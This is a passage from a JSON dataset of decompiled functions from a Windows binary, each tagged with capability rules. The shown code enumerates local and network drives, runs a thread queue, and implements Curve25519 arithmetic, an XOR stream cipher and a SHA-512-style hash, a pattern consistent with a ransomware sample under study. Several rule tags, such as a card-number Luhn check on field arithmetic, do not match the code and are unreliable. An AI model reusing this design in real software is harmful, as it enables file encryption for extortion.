(*_sym.imp.KERNEL32.dll_GetDriveTypeW)(iVar4);\n                        if ((iVar5 != 0) && (iVar5 != 5)) {\n                            if (iVar5 == 4) {\n                                var_30h = 0x104;\n                                iVar5 = fcn.00410af0(0x208);\n                                if (iVar5 != 0) {\n                                    iVar6 = sub.MPR.dll_WNetGetConnectionW(uVar1, iVar5, &var_30h, iVar4 + 8);\n                                    if (iVar6 == 0) {\n                                        fcn.00407150(iVar5);\n                                        fcn.00410ad0(iVar5);\n                                    }\n                                }\n                            }\n                            else {\n                                fcn.00407150(iVar4);\n                            }\n                        }\n                        fcn.00410ad0(iVar4);\n                    }\n                }\n                var_68h = var_68h >> 1;\n            }\n        }\n        iVar4 = (*_sym.imp.KERNEL32.dll_lstrcmpW)(iVar2, 0x4013f0);\n        if ((iVar4 == 0) || (iVar2 == 0)) {\n            fcn.00407360(0);\n        }\n        for (var_80h = 0; var_80h < uVar7; var_80h = var_80h + 1) {\n            fcn.00410bf0(0);\n        }\n        (*_sym.imp.KERNEL32.dll_WaitForMultipleObjects)(uVar7, arg_8h, 1, 0xffffffff);\n        for (hObject = 0; hObject < uVar7; hObject = hObject + 1) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(*(arg_8h + hObject * 4));\n        }\n        fcn.00410ad0(arg_8h);\n    }\n    (*_sym.imp.USER32.dll_MessageBoxA)(0, 0x4013fc, 0, 0);\n    uVar1 = 0;\n    (*_sym.imp.KERNEL32.dll_ExitProcess)();\n    fcn.00410cf7(uVar1);\n    return;\n}\n",
        "token_count": 2152
    },
    "0040cb70": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_48h\n\nvoid __cdecl fcn.0040cb70(uint noname_0, uint arg_ch, uint32_t *arg_10h, uint32_t *arg_14h, uint32_t arg_18h)\n\n{\n    uint32_t var_48h;\n    uint32_t var_44h;\n    uint32_t uStack68;\n    uint32_t uStack64;\n    uint32_t uStack60;\n    uint32_t uStack56;\n    uint32_t uStack52;\n    uint32_t uStack48;\n    uint32_t uStack44;\n    uint32_t uStack40;\n    uint32_t uStack36;\n    uint32_t uStack32;\n    uint32_t uStack28;\n    uint32_t uStack24;\n    uint32_t uStack20;\n    uint32_t uStack16;\n    uint32_t uStack12;\n    uint32_t var_4h;\n    \n    var_4h = *0x4110a4 ^ &stack0xfffffffc;\n    for (; 0x3f < arg_18h; arg_18h = arg_18h - 0x40) {\n        fcn.00407b20(arg_ch, &var_44h);\n        *arg_14h = *arg_10h ^ var_44h;\n        arg_14h[1] = arg_10h[1] ^ uStack68;\n        arg_14h[2] = arg_10h[2] ^ uStack64;\n        arg_14h[3] = arg_10h[3] ^ uStack60;\n        arg_14h[4] = arg_10h[4] ^ uStack56;\n        arg_14h[5] = arg_10h[5] ^ uStack52;\n        arg_14h[6] = arg_10h[6] ^ uStack48;\n        arg_14h[7] = arg_10h[7] ^ uStack44;\n        arg_14h[8] = arg_10h[8] ^ uStack40;\n        arg_14h[9] = arg_10h[9] ^ uStack36;\n        arg_14h[10] = arg_10h[10] ^ uStack32;\n        arg_14h[0xb] = arg_10h[0xb] ^ uStack28;\n        arg_14h[0xc] = arg_10h[0xc] ^ uStack24;\n        arg_14h[0xd] = arg_10h[0xd] ^ uStack20;\n        arg_14h[0xe] = arg_10h[0xe] ^ uStack16;\n        arg_14h[0xf] = arg_10h[0xf] ^ uStack12;\n        arg_10h = arg_10h + 0x10;\n        arg_14h = arg_14h + 0x10;\n    }\n    if (arg_18h != 0) {\n        fcn.00407b20(arg_ch, &var_44h);\n        for (var_48h = 0; var_48h < arg_18h; var_48h = var_48h + 1) {\n            *(arg_14h + var_48h) = *(arg_10h + var_48h) ^ *(&var_44h + var_48h);\n        }\n    }\n    fcn.00410cf7(var_48h);\n    return;\n}\n",
        "token_count": 778
    },
    "0040cea0": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040cea0(uint8_t *arg_8h, int32_t arg_ch)\n\n{\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = 0x676e6f64;\n    while( true ) {\n        if (arg_ch == 0) break;\n        var_4h = var_4h << 8 ^ *((var_4h >> 0x18 ^ *arg_8h) * 4 + 0x401418);\n        arg_8h = arg_8h + 1;\n        arg_ch = arg_ch + -1;\n    }\n    return var_4h;\n}\n",
        "token_count": 153
    },
    "0040cf50": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_9ch\n\nvoid __cdecl fcn.0040cf50(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    uint32_t var_9ch;\n    uint var_98h;\n    uint32_t var_94h;\n    uint32_t var_90h;\n    int32_t var_8ch;\n    int32_t var_88h;\n    uint var_84h;\n    uint32_t auStack132 [31];\n    uint32_t var_4h;\n    \n    var_4h = *0x4110a4 ^ &stack0xfffffffc;\n    var_8ch = arg_ch;\n    var_90h = arg_10h;\n    for (var_88h = 0; var_88h < 4; var_88h = var_88h + 1) {\n        *(arg_8h + 0xc4 + var_88h * 4) = *(arg_8h + 0xc4 + var_88h * 4) + var_90h;\n        var_94h = *(arg_8h + 0xc4 + var_88h * 4) < var_90h;\n        var_90h = var_94h;\n    }\n    if ((*(arg_8h + 0xc0) == 0) || (0x7f < *(arg_8h + 0xc0) + arg_10h)) {\n        while (0x7f < *(arg_8h + 0xc0) + arg_10h) {\n            fcn.00410b50(arg_8h + 0x40 + *(arg_8h + 0xc0), var_8ch, 0x80 - *(arg_8h + 0xc0));\n            var_8ch = (0x80 - *(arg_8h + 0xc0)) + var_8ch;\n            arg_10h = arg_10h - (0x80 - *(arg_8h + 0xc0));\n            for (var_88h = 0; var_88h < 0x10; var_88h = var_88h + 1) {\n                var_9ch = *(arg_8h + 0x44 + var_88h * 8) << 0x18 | *(arg_8h + 0x45 + var_88h * 8) << 0x10 |\n                          *(arg_8h + 0x46 + var_88h * 8) << 8 | *(arg_8h + 0x47 + var_88h * 8);\n                auStack132[var_88h * 2 + -1] =\n                     *(arg_8h + 0x40 + var_88h * 8) << 0x18 | *(arg_8h + 0x41 + var_88h * 8) << 0x10 |\n                     *(arg_8h + 0x42 + var_88h * 8) << 8 | *(arg_8h + 0x43 + var_88h * 8);\n                auStack132[var_88h * 2] = var_9ch;\n            }\n            fcn.0040d620(arg_8h, &var_84h);\n            *(arg_8h + 0xc0) = 0;\n        }\n        fcn.00410b50(arg_8h + 0x40, var_8ch, arg_10h);\n        *(arg_8h + 0xc0) = arg_10h;\n    }\n    else {\n        fcn.00410b50(arg_8h + 0x40 + *(arg_8h + 0xc0), arg_ch, arg_10h);\n        *(arg_8h + 0xc0) = *(arg_8h + 0xc0) + arg_10h;\n    }\n    fcn.00410cf7(var_9ch);\n    return;\n}\n",
        "token_count": 904
    },
    "0040d220": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_b4h\n\nvoid __cdecl\nfcn.0040d220(int32_t arg_8h, int32_t arg_ch, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint noname_15, uint noname_16, uint noname_17, uint noname_18, uint noname_19, \n            uint noname_20, uint noname_21, uint noname_22, uint noname_23, uint noname_24, uint noname_25, \n            uint noname_26, uint noname_27, uint noname_28, uint noname_29, uint arg_80h)\n\n{\n    int32_t iVar1;\n    uint var_b4h;\n    uint32_t auStack180 [3];\n    uint32_t var_a4h;\n    int32_t var_a0h;\n    int32_t var_9ch;\n    uint32_t var_98h;\n    int32_t var_94h;\n    uint var_90h;\n    uint var_8ch;\n    int32_t var_88h;\n    uint var_84h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4110a4 ^ &stack0xfffffffc;\n    if (*(arg_8h + 0xc0) < 0x70) {\n        var_94h = 0x70 - *(arg_8h + 0xc0);\n    }\n    else {\n        var_94h = 0xf0 - *(arg_8h + 0xc0);\n    }\n    var_88h = 4;\n    while( true ) {\n        var_9ch = var_88h;\n        iVar1 = var_88h + -1;\n        if (var_88h == 0) break;\n        var_a0h = *(arg_8h + 0xc4 + iVar1 * 4);\n        if (iVar1 < 1) {\n            var_98h = 0;\n        }\n        else {\n            var_98h = *(arg_8h + 0xc0 + iVar1 * 4);\n        }\n        var_a4h = var_98h;\n        auStack180[var_88h + -2] = var_a0h << 3 | var_98h >> 0x1d;\n        var_88h = iVar1;\n    }\n    var_88h = iVar1;\n    fcn.00410b20(&var_84h, 0, var_94h);\n    var_84h._0_1_ = 0x80;\n    fcn.0040cf50(arg_8h, &var_84h, var_94h);\n    for (var_88h = 0; var_88h < 4; var_88h = var_88h + 1) {\n        *(&var_84h + var_88h) = auStack180[2 - var_88h] >> 0x18;\n        *(&var_84h + var_88h * 4 + 1) = auStack180[2 - var_88h] >> 0x10;\n        *(&var_84h + var_88h * 4 + 2) = auStack180[2 - var_88h] >> 8;\n        *(&var_84h + var_88h * 4 + 3) = auStack180[2 - var_88h];\n    }\n    fcn.0040cf50(arg_8h, &var_84h, 0x10);\n    for (var_88h = 0; var_88h < 8; var_88h = var_88h + 1) {\n        var_8ch = *(arg_8h + var_88h * 8);\n        var_90h = *(arg_8h + 4 + var_88h * 8);\n        *(arg_ch + var_88h * 8) = var_8ch >> 0x18;\n        *(arg_ch + 1 + var_88h * 8) = var_8ch >> 0x10;\n        *(arg_ch + 2 + var_88h * 8) = var_8ch >> 8;\n        *(arg_ch + 3 + var_88h * 8) = var_8ch;\n        *(arg_ch + 4 + var_88h * 8) = var_90h >> 0x18;\n        *(arg_ch + 5 + var_88h * 8) = var_90h >> 0x10;\n        *(arg_ch + 6 + var_88h * 8) = var_90h >> 8;\n        *(arg_ch + 7 + var_88h * 8) = var_90h;\n    }\n    fcn.00410cf7(var_b4h);\n    return;\n}\n",
        "token_count": 1159
    },
    "00410af0": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00410af0(int32_t dwBytes)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    do {\n        iVar1 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(*0x4110b0, 8, dwBytes + 0x40);\n    } while (iVar1 == 0);\n    return iVar1;\n}\n",
        "token_count": 88
    },
    "00410bf0": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00410bf0(int32_t lpString2)\n\n{\n    int32_t iVar1;\n    uint lpString1;\n    \n    lpString1 = 0;\n    if (lpString2 != 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_lstrlenW)(lpString2);\n        lpString1 = fcn.00410af0(iVar1 * 4 + 4);\n        (*_sym.imp.KERNEL32.dll_lstrcpyW)(lpString1, lpString2);\n    }\n    (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*0x4110b4, 0xffffffff);\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(0x4110bc);\n    *(*0x4110d8 + *0x4110dc * 4) = lpString1;\n    *0x4110dc = (*0x4110dc + 1) % *0x4110d4;\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x4110bc);\n    (*_sym.imp.KERNEL32.dll_ReleaseSemaphore)(*0x4110b8, 1, 0);\n    return;\n}\n",
        "token_count": 260
    },
    "00401fb0": {
        "rules": [
            "encrypt data using Curve25519/f8ce07bf90384b3481717cbf54aaf528"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_170h\n\nvoid __cdecl fcn.00401fb0(uint arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    int32_t var_170h;\n    uint var_16ch;\n    uint var_11ch;\n    uint var_cch;\n    uint var_7ch;\n    uint var_24h;\n    uint8_t uStack9;\n    uint32_t var_4h;\n    \n    var_4h = *0x4110a4 ^ &stack0xfffffffc;\n    for (var_170h = 0; var_170h < 0x20; var_170h = var_170h + 1) {\n        *(&var_24h + var_170h) = *(arg_ch + var_170h);\n    }\n    var_24h._0_1_ = var_24h & 0xf8;\n    uStack9 = uStack9 & 0x7f | 0x40;\n    fcn.00404d90(&var_cch, arg_10h);\n    fcn.00406160(&var_16ch, &var_7ch, &var_24h, &var_cch);\n    fcn.00406580(&var_11ch, &var_7ch);\n    fcn.00403fc0(&var_7ch, &var_16ch, &var_11ch);\n    fcn.00405370(arg_8h, &var_7ch);\n    fcn.00410cf7(var_170h);\n    return;\n}\n",
        "token_count": 356
    },
    "004020e0": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004020e0(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t var_4h;\n    \n    for (var_4h = 0; var_4h < 10; var_4h = var_4h + 2) {\n        uVar2 = *(arg_8h + var_4h * 8);\n        puVar1 = arg_ch + var_4h * 8;\n        uVar3 = *puVar1;\n        iVar4 = *(arg_ch + 4 + var_4h * 8);\n        *(arg_8h + var_4h * 8) = uVar2 + *puVar1;\n        *(arg_8h + 4 + var_4h * 8) = *(arg_8h + 4 + var_4h * 8) + iVar4 + CARRY4(uVar2, uVar3);\n        uVar2 = *(arg_8h + 8 + var_4h * 8);\n        puVar1 = arg_ch + 8 + var_4h * 8;\n        uVar3 = *puVar1;\n        iVar4 = *(arg_ch + 0xc + var_4h * 8);\n        *(arg_8h + 8 + var_4h * 8) = uVar2 + *puVar1;\n        *(arg_8h + 0xc + var_4h * 8) = *(arg_8h + 0xc + var_4h * 8) + iVar4 + CARRY4(uVar2, uVar3);\n    }\n    return;\n}\n",
        "token_count": 399
    },
    "00402160": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402160(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t var_4h;\n    \n    for (var_4h = 0; var_4h < 10; var_4h = var_4h + 1) {\n        uVar2 = *(arg_ch + var_4h * 8);\n        puVar1 = arg_8h + var_4h * 8;\n        uVar3 = *puVar1;\n        iVar4 = *(arg_ch + 4 + var_4h * 8);\n        *(arg_8h + var_4h * 8) = uVar2 - *puVar1;\n        *(arg_8h + 4 + var_4h * 8) = (iVar4 - *(arg_8h + 4 + var_4h * 8)) - (uVar2 < uVar3);\n    }\n    return;\n}\n",
        "token_count": 245
    },
    "004021b0": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004021b0(int32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    ulong uVar1;\n    uint32_t var_4h;\n    \n    for (var_4h = 0; var_4h < 10; var_4h = var_4h + 1) {\n        uVar1 = fcn.00410d10();\n        *(arg_8h + var_4h * 8) = uVar1;\n        *(arg_8h + 4 + var_4h * 8) = uVar1 >> 0x20;\n    }\n    return;\n}\n",
        "token_count": 152
    },
    "00403d50": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403d50(uint32_t *arg_8h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    ulong uVar3;\n    ulong uVar4;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    arg_8h[0x14] = 0;\n    arg_8h[0x15] = 0;\n    for (var_4h = 0; var_4h < 10; var_4h = var_4h + 2) {\n        uVar3 = fcn.00403cd0(arg_8h[var_4h * 2], arg_8h[var_4h * 2 + 1]);\n        uVar4 = fcn.00410d50();\n        uVar1 = arg_8h[var_4h * 2];\n        uVar2 = arg_8h[var_4h * 2 + 1];\n        arg_8h[var_4h * 2] = uVar1 - uVar4;\n        arg_8h[var_4h * 2 + 1] = (uVar2 - (uVar4 >> 0x20)) - (uVar1 < uVar4);\n        uVar1 = arg_8h[var_4h * 2 + 2];\n        arg_8h[var_4h * 2 + 2] = uVar1 + uVar3;\n        arg_8h[var_4h * 2 + 3] = arg_8h[var_4h * 2 + 3] + (uVar3 >> 0x20) + CARRY4(uVar1, uVar3);\n        uVar3 = fcn.00403d10(arg_8h[var_4h * 2 + 2], arg_8h[var_4h * 2 + 3]);\n        uVar4 = fcn.00410d50();\n        uVar1 = arg_8h[var_4h * 2 + 2];\n        arg_8h[var_4h * 2 + 2] = uVar1 - uVar4;\n        arg_8h[var_4h * 2 + 3] = (arg_8h[var_4h * 2 + 3] - (uVar4 >> 0x20)) - (uVar1 < uVar4);\n        uVar1 = arg_8h[var_4h * 2 + 4];\n        arg_8h[var_4h * 2 + 4] = uVar1 + uVar3;\n        arg_8h[var_4h * 2 + 5] = arg_8h[var_4h * 2 + 5] + (uVar3 >> 0x20) + CARRY4(uVar1, uVar3);\n    }\n    uVar3 = fcn.00410d50();\n    uVar1 = *arg_8h;\n    *arg_8h = uVar3 + *arg_8h;\n    arg_8h[1] = (uVar3 >> 0x20) + arg_8h[1] + CARRY4(uVar3, uVar1);\n    uVar3 = fcn.00410d50();\n    uVar1 = *arg_8h;\n    *arg_8h = uVar3 + *arg_8h;\n    arg_8h[1] = (uVar3 >> 0x20) + arg_8h[1] + CARRY4(uVar3, uVar1);\n    uVar1 = *arg_8h;\n    *arg_8h = uVar1 + arg_8h[0x14];\n    arg_8h[1] = arg_8h[1] + arg_8h[0x15] + CARRY4(uVar1, arg_8h[0x14]);\n    arg_8h[0x14] = 0;\n    arg_8h[0x15] = 0;\n    uVar3 = fcn.00403cd0(*arg_8h, arg_8h[1]);\n    uVar4 = fcn.00410d50();\n    uVar1 = *arg_8h;\n    *arg_8h = uVar1 - uVar4;\n    arg_8h[1] = (arg_8h[1] - (uVar4 >> 0x20)) - (uVar1 < uVar4);\n    uVar1 = arg_8h[2];\n    arg_8h[2] = uVar1 + uVar3;\n    arg_8h[3] = arg_8h[3] + (uVar3 >> 0x20) + CARRY4(uVar1, uVar3);\n    return;\n}\n",
        "token_count": 1091
    },
    "004060e0": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004060e0(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    for (var_4h = 0; var_4h < 10; var_4h = var_4h + 1) {\n        uVar2 = (*(arg_8h + var_4h * 8) ^ *(arg_ch + var_4h * 8)) & -arg_10h;\n        uVar1 = *(arg_8h + var_4h * 8) ^ uVar2;\n        *(arg_8h + var_4h * 8) = uVar1;\n        *(arg_8h + 4 + var_4h * 8) = uVar1 >> 0x1f;\n        uVar2 = *(arg_ch + var_4h * 8) ^ uVar2;\n        *(arg_ch + var_4h * 8) = uVar2;\n        *(arg_ch + 4 + var_4h * 8) = uVar2 >> 0x1f;\n    }\n    return;\n}\n",
        "token_count": 290
    },
    "00406580": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_328h\n\nvoid __cdecl fcn.00406580(uint arg_8h, uint arg_ch)\n\n{\n    int32_t var_328h;\n    uint var_324h;\n    uint var_2d4h;\n    uint var_284h;\n    uint var_234h;\n    uint var_1e4h;\n    uint var_194h;\n    uint var_144h;\n    uint var_f4h;\n    uint var_a4h;\n    uint var_54h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4110a4 ^ &stack0xfffffffc;\n    fcn.00404d20(&var_194h, arg_ch);\n    fcn.00404d20(&var_a4h, &var_194h);\n    fcn.00404d20(&var_54h, &var_a4h);\n    fcn.00403fc0(&var_1e4h, &var_54h, arg_ch);\n    fcn.00403fc0(&var_324h, &var_1e4h, &var_194h);\n    fcn.00404d20(&var_54h, &var_324h);\n    fcn.00403fc0(&var_234h, &var_54h, &var_1e4h);\n    fcn.00404d20(&var_54h, &var_234h);\n    fcn.00404d20(&var_a4h, &var_54h);\n    fcn.00404d20(&var_54h, &var_a4h);\n    fcn.00404d20(&var_a4h, &var_54h);\n    fcn.00404d20(&var_54h, &var_a4h);\n    fcn.00403fc0(&var_f4h, &var_54h, &var_234h);\n    fcn.00404d20(&var_54h, &var_f4h);\n    fcn.00404d20(&var_a4h, &var_54h);\n    for (var_328h = 2; var_328h < 10; var_328h = var_328h + 2) {\n        fcn.00404d20(&var_54h, &var_a4h);\n        fcn.00404d20(&var_a4h, &var_54h);\n    }\n    fcn.00403fc0(&var_284h, &var_a4h, &var_f4h);\n    fcn.00404d20(&var_54h, &var_284h);\n    fcn.00404d20(&var_a4h, &var_54h);\n    for (var_328h = 2; var_328h < 0x14; var_328h = var_328h + 2) {\n        fcn.00404d20(&var_54h, &var_a4h);\n        fcn.00404d20(&var_a4h, &var_54h);\n    }\n    fcn.00403fc0(&var_54h, &var_a4h, &var_284h);\n    fcn.00404d20(&var_a4h, &var_54h);\n    fcn.00404d20(&var_54h, &var_a4h);\n    for (var_328h = 2; var_328h < 10; var_328h = var_328h + 2) {\n        fcn.00404d20(&var_a4h, &var_54h);\n        fcn.00404d20(&var_54h, &var_a4h);\n    }\n    fcn.00403fc0(&var_144h, &var_54h, &var_f4h);\n    fcn.00404d20(&var_54h, &var_144h);\n    fcn.00404d20(&var_a4h, &var_54h);\n    for (var_328h = 2; var_328h < 0x32; var_328h = var_328h + 2) {\n        fcn.00404d20(&var_54h, &var_a4h);\n        fcn.00404d20(&var_a4h, &var_54h);\n    }\n    fcn.00403fc0(&var_2d4h, &var_a4h, &var_144h);\n    fcn.00404d20(&var_a4h, &var_2d4h);\n    fcn.00404d20(&var_54h, &var_a4h);\n    for (var_328h = 2; var_328h < 100; var_328h = var_328h + 2) {\n        fcn.00404d20(&var_a4h, &var_54h);\n        fcn.00404d20(&var_54h, &var_a4h);\n    }\n    fcn.00403fc0(&var_a4h, &var_54h, &var_2d4h);\n    fcn.00404d20(&var_54h, &var_a4h);\n    fcn.00404d20(&var_a4h, &var_54h);\n    for (var_328h = 2; var_328h < 0x32; var_328h = var_328h + 2) {\n        fcn.00404d20(&var_54h, &var_a4h);\n        fcn.00404d20(&var_a4h, &var_54h);\n    }\n    fcn.00403fc0(&var_54h, &var_a4h, &var_144h);\n    fcn.00404d20(&var_a4h, &var_54h);\n    fcn.00404d20(&var_54h, &var_a4h);\n    fcn.00404d20(&var_a4h, &var_54h);\n    fcn.00404d20(&var_54h, &var_a4h);\n    fcn.00404d20(&var_a4h, &var_54h);\n    fcn.00403fc0(arg_8h, &var_a4h, &var_324h);\n    fcn.00410cf7(var_328h);\n    return;\n}\n",
        "token_count": 1434
    },
    "00402200": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/a3d2ca57787b45ac887fefbb531cd56b",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55/f4adb04e51ec4c55be451936d9d27cc9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402200(uint *arg_8h, int32_t *arg_ch, int32_t *arg_10h)\n\n{\n    ulong uVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    int64_t iVar6;\n    int64_t iVar7;\n    int64_t iVar8;\n    int64_t iVar9;\n    int64_t iVar10;\n    int64_t iVar11;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.00410d10(*arg_ch, *arg_ch >> 0x1f, *arg_10h, *arg_10h >> 0x1f);\n    *arg_8h = uVar1;\n    arg_8h[1] = uVar1 >> 0x20;\n    iVar2 = fcn.00410d10(*arg_ch, *arg_ch >> 0x1f, arg_10h[2], arg_10h[2] >> 0x1f);\n    iVar3 = fcn.00410d10(arg_ch[2], arg_ch[2] >> 0x1f, *arg_10h, *arg_10h >> 0x1f);\n    arg_8h[2] = iVar2 + iVar3;\n    arg_8h[3] = iVar2 + iVar3 >> 0x20;\n    uVar1 = fcn.00410d10(arg_ch[2], arg_ch[2] >> 0x1f, 2, 0);\n    iVar3 = fcn.00410d10(uVar1, arg_10h[2], arg_10h[2] >> 0x1f);\n    iVar4 = fcn.00410d10(*arg_ch, *arg_ch >> 0x1f, arg_10h[4], arg_10h[4] >> 0x1f);\n    iVar2 = fcn.00410d10(arg_ch[4], arg_ch[4] >> 0x1f, *arg_10h, *arg_10h >> 0x1f);\n    iVar2 = iVar3 + iVar4 + iVar2;\n    arg_8h[4] = iVar2;\n    arg_8h[5] = iVar2 >> 0x20;\n    iVar3 = fcn.00410d10(arg_ch[2], arg_ch[2] >> 0x1f, arg_10h[4], arg_10h[4] >> 0x1f);\n    iVar4 = fcn.00410d10(arg_ch[4], arg_ch[4] >> 0x1f, arg_10h[2], arg_10h[2] >> 0x1f);\n    iVar5 = fcn.00410d10(*arg_ch, *arg_ch >> 0x1f, arg_10h[6], arg_10h[6] >> 0x1f);\n    iVar2 = fcn.00410d10(arg_ch[6], arg_ch[6] >> 0x1f, *arg_10h, *arg_10h >> 0x1f);\n    iVar2 = iVar3 + iVar4 + iVar5 + iVar2;\n    arg_8h[6] = iVar2;\n    arg_8h[7] = iVar2 >> 0x20;\n    iVar3 = fcn.00410d10(arg_ch[4], arg_ch[4] >> 0x1f, arg_10h[4], arg_10h[4] >> 0x1f);\n    iVar2 = fcn.00410d10(arg_ch[2], arg_ch[2] >> 0x1f, arg_10h[6], arg_10h[6] >> 0x1f);\n    iVar4 = fcn.00410d10(arg_ch[6], arg_ch[6] >> 0x1f, arg_10h[2], arg_10h[2] >> 0x1f);\n    iVar4 = fcn.00410d10(iVar2 + iVar4, 2, 0);\n    iVar5 = fcn.00410d10(*arg_ch, *arg_ch >> 0x1f, arg_10h[8], arg_10h[8] >> 0x1f);\n    iVar2 = fcn.00410d10(arg_ch[8], arg_ch[8] >> 0x1f, *arg_10h, *arg_10h >> 0x1f);\n    iVar2 = iVar3 + iVar4 + iVar5 + iVar2;\n    arg_8h[8] = iVar2;\n    arg_8h[9] = iVar2 >> 0x20;\n    iVar3 = fcn.00410d10(arg_ch[4], arg_ch[4] >> 0x1f, arg_10h[6], arg_10h[6] >> 0x1f);\n    iVar4 = fcn.00410d10(arg_ch[6], arg_ch[6] >> 0x1f, arg_10h[4], arg_10h[4] >> 0x1f);\n    iVar5 = fcn.00410d10(arg_ch[2], arg_ch[2] >> 0x1f, arg_10h[8], arg_10h[8] >> 0x1f);\n    iVar6 = fcn.00410d10(arg_ch[8], arg_ch[8] >> 0x1f, arg_10h[2], arg_10h[2] >> 0x1f);\n    iVar7 = fcn.00410d10(*arg_ch, *arg_ch >> 0x1f, arg_10h[10], arg_10h[10] >> 0x1f);\n    iVar2 = fcn.00410d10(arg_ch[10], arg_ch[10] >> 0x1f, *arg_10h, *arg_10h >> 0x1f);\n    iVar2 = iVar3 + iVar4 + iVar5 + iVar6 + iVar7 + iVar2;\n    arg_8h[10] = iVar2;\n    arg_8h[0xb] = iVar2 >> 0x20;\n    iVar2 = fcn.00410d10(arg_ch[6], arg_ch[6] >> 0x1f, arg_10h[6], arg_10h[6] >> 0x1f);\n    iVar3 = fcn.00410d10(arg_ch[2], arg_ch[2] >> 0x1f, arg_10h[10], arg_10h[10] >> 0x1f);\n    iVar4 = fcn.00410d10(arg_ch[10], arg_ch[10] >> 0x1f, arg_10h[2], arg_10h[2] >> 0x1f);\n    iVar3 = fcn.00410d10(iVar2 + iVar3 + iVar4, 2, 0);\n    iVar4 = fcn.00410d10(arg_ch[4], arg_ch[4] >> 0x1f, arg_10h[8], arg_10h[8] >> 0x1f);\n    iVar5 = fcn.00410d10(arg_ch[8], arg_ch[8] >> 0x1f, arg_10h[4], arg_10h[4] >> 